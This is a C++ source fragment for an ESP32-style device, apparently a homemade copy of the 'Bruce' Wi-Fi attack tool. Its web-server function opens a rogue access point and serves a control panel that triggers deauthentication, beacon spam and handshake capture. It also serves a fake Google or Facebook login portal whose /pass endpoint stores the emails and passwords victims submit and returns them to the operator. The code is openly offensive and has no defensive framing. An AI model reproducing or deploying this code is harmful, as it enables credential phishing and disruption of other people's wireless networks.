// ==================== ВЕБ-СЕРВЕР ====================
void webStart() {
  if(webRunning) return;
  WiFi.softAP("DIY_BRUCE","bruce1234");
  server.on("/",[](){ server.send(200,"text/html",webPage); });
  server.on("/portal.html",[](){ server.send(200,"text/html",(evilChoice=="google")?googlePage:facebookPage); });
  server.on("/cmd",[](){
    if(!server.hasArg("c")){ server.send(200,"text/plain","OK"); return; }
    String c = server.arg("c");
    if(c=="scan") wifiScan();
    else if(c=="deauth") wifiDeauth();
    else if(c=="beacon") wifiBeacon();
    else if(c=="handshake") wifiHandshake();
    else if(c=="evilsel") evilPortalSelect();
    else if(c=="getpass") { server.send(200,"text/plain",capturedPasswords); return; }
    else if(c=="gethand") { server.send(200,"text/plain",handshakes); return; }
    server.send(200,"text/plain","OK");
  });
  server.on("/pass",HTTP_POST,[](){
    String email = server.hasArg("email")?server.arg("email"):"";
    String pwd = server.hasArg("pass")?server.arg("pass"):"";
    if(email.length()>0 || pwd.length()>0) capturedPasswords += "[PASS] Email:"+email+" Pass:"+pwd+"\n";
    server.send(200,"text/html","<html><body><h3>OK</h3><script>setTimeout(function(){window.location.href='/';},2000);</script></body></html>");
  });
  server.begin();
  webRunning=true;
  showMessage("WEB:192.168.4.1",2000);
}
